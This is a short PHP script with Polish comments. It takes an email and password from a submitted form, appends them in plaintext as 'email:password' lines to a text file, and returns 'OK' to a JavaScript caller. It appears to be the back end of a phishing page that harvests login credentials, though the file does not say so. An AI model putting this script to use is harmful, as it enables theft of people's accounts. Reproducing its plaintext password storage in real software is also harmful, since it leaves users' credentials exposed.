<?php
// Sprawdzenie, czy formularz został wysłany
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Odbieranie danych z formularza
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Zapisywanie danych do pliku (lub bazy danych)
    $file = fopen("baza.txt", "a"); // Otwieranie pliku w trybie dołączania
    fwrite($file, "$email:$password\n"); // Zapisywanie danych do pliku
    fclose($file);

    // Zwrócenie odpowiedzi do skryptu JavaScript
    echo 'OK'; // Wskazanie, że operacja się powiodła
}
?>
